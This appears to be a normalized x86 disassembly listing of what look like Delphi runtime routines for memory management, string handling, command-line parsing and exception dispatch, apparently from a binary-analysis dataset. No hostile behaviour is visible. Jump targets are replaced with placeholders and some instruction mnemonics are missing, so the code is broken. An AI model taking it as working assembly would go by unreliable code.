and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401410
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403b20
jmp r-xdata
call sub_401f40
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c50
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401eb8
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c50
sub_4024cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f40
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c50
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_402044
test al al
je r-xdata
call sub_401c50
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401d14
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401eb8
jmp r-xdata
sub_4026a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_402759
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401aac
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4024cc
test al al
je r-xdata
push rw-data
call sub_401408
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402198
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_402968
mov eax ebx
call sub_402328
retn
push rw-data
call sub_401410
sub_40276c
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_4028c8
sub_40278c
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_4028c8
sub_4027ac
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
mov [ ecx ] eax
mov al 0x2
jmp sub_4028c8
retn
mov [ ecx ] eax
retn
sub_40283c
push ebx
push esi
call sub_406058
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406058
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406058
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_40287c
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406058
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_402870
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402904
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402968
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4029a8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_4012cc
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_404684
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_4012cc
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_4012cc
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_4012cc
cmp eax ebx
jbe r-xdata
push ebx
call sub_4012cc
mov ebx eax
jmp r-xdata
push ebx
call sub_4012cc
mov ebx eax
jmp r-xdata
push ebx
call sub_4012cc
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_4012cc
mov ebx eax
jmp r-xdata
push ebx
call sub_4012cc
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a94
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404038
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40130c
mov ecx eax
mov edx esp
mov eax ebx
call sub_404128
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4029a8
mov edi eax
test esi esi
je r-xdata
sub_402b40
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4028f4
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b94
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_4028f4
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_4028f4
jmp r-xdata
sub_402bec
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_402968
pop ebx
retn
mov ecx ebx
sub_402c08
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c8c
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402cfc
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402d1c
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402dfc
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402e3c
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eef ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eef ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402eef
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_403128
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403158
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_401364
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_4031c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40136c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40135c
retn
sub_40324c
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4032f4
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_40334c
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a74
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_40336c
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405940
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_40339c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403420
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403430
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403427
lea eax [ ebp - 0x8 ]
call sub_405928
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_40336c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405940
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403430
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403474
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403514
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4034b4
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4034e4
push eax
push ecx
mov eax [ eax ]
call sub_4034b4
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_40402c
call [ rw-data ]
sub_4034fc
push esi
mov esi edx
mov eax [ eax ]
call sub_4034b4
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_40402c
call [ rw-data ]
sub_403544
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4034b4
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_40356c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4035bc
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_40360c
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403635
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4036a0
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4036dc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036f0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403704
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403724
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403704
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403788
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_40321c
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406058
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4036f0
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4036a0
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4038b4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_40321c
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4036a0
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406058
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4036dc
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
